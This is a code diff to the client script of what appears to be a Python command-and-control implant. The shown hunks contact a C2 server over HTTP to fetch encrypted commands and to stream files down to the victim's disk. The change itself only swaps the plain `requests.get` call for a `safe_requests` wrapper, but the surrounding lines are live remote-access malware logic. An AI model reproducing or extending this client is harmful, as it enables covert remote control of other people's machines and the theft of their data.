@@ -5,7 +5,7 @@ Last Update: 10 oct 2024, 16 mehr 1403
 """
 
 
-from requests import get, exceptions, post, put
+from requests import exceptions, post, put
 from os import getenv, chdir, path, getcwd
 from colorama import Fore
 from time import time, sleep
@@ -22,6 +22,7 @@ from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
                       C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, INCOMING)
+from security import safe_requests
 
 
 # Print C2 Client Side Message for avoid complexing in test operation
@@ -111,7 +112,7 @@ if __name__ == "__main__":
         '''Try an http get requests to the C2 Server and retrieve command;
         if failed, Keep Trying forever.'''
         try:
-            response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
+            response = safe_requests.get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
 
             # test print
             # print(client.split("@")[0], "=>", response.status_code, sep=" ")
@@ -220,7 +221,7 @@ if __name__ == "__main__":
 
             # Use and HTTP GET request to stream the requested file from c2 server
             try:
-                with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
+                with safe_requests.get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
                          headers=HEADERS, proxies=PROXY) as response:
 
                     # If the file was not found, open it up and write it out to disk, then notify us on the server
